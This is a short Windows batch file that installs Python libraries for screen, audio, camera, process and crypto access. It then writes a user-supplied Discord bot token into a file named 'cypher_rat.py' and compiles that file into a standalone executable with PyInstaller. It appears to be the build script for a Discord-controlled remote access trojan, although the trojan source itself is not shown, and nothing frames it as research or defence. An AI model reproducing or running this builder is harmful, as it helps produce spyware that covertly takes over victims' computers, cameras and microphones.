@echo off



rem Install discord.py
pip install discord.py

rem Install psutil
pip install psutil

rem Install pyautogui
pip install pyautogui

rem Install pyaudio
pip install pyaudio

rem Install OpenCV (cv2)
pip install opencv-python

rem Install pycryptodome
pip install pycryptodome

rem Install imageio
pip install imageio

rem Install Pyinstaller 
pip install pyinstaller

pause

set /p user_input=Enter the token:
echo TOKEN = '%user_input%' >> cypher_rat.py
echo bot.run(TOKEN) >> cypher_rat.py

pyinstaller --onefile cypher_rat.py
